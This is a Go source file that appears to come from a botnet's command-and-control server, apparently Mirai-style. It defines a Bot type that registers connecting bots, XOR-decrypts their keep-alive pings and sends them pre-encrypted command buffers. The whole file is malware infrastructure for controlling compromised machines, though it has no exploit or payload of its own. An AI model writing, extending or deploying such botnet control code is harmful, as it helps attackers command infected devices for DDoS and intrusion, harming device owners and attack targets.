package main

import (
    "net"
    "time"
)

// Bot represents a connected bot with its unique ID, connection, version, and source.
type Bot struct {
    uid         int
    conn        net.Conn
    version     byte
    source      string
    lastPing    time.Time
    uidAssigned chan struct{} // Per-bot channel for UID assignment
}

// NewBot creates a new Bot instance with the given connection, version, and source.
func NewBot(conn net.Conn, version byte, source string) *Bot {
    return &Bot{
        uid:         -1,
        conn:        conn,
        version:     version,
        source:      source,
        lastPing:    time.Now(),
        uidAssigned: make(chan struct{}),
    }
}

// Handle manages the bot's connection, decrypting incoming pings and keeping the connection alive.
func (this *Bot) Handle() {
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 2)
    for {
        this.conn.SetDeadline(time.Now().Add(300 * time.Second))
        n, err := this.conn.Read(buf)
        if err != nil || n != 2 {
            return
        }
        xorCrypt(buf) // Decrypt incoming data
        if buf[0] == 0 && buf[1] == 0 {
            this.lastPing = time.Now() // Update on ping
        }
    }
}

// QueueBuf sends a pre-encrypted buffer to the bot over the connection.
func (this *Bot) QueueBuf(buf []byte) {
    this.conn.Write(buf) // Assumes buf is already encrypted
}
